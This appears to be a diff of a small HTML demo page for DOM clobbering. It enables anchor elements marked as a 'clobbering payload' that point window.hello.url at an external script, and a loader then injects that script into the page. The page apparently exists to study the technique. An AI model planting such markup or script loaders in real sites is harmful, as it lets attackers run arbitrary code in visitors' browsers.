@@ -5,26 +5,14 @@
 </head>
 <body>
     /////clobbering payload/////
-<!--     <a id="hello"><\a>
-    <a id="hello" name=url href="https://gaeunbae.github.io/hello.js"></a> -->
+    <a id="hello"><\a>
+    <a id="hello" name=url href="https://gaeunbae.github.io/hello.js"></a>
     ///////////////////////////
-
-
-
-
-
-
-
-
-    <form id="script-form">
-        <button type="button" onclick="makeScript()">Make Script!</button>
-    </form>    
+  
     <script>
-        function makeScript(){
-            window.hello = {
-                url: "https://example.com/script.js" // Replace with the actual URL of the script you want to load
-            };
-        }
+        window.hello = {
+            url: "https://example.com/script.js" // Replace with the actual URL of the script you want to load
+        };
         let someObject = window.hello || {};
         if (someObject.url) {
             let script = document.createElement('script');
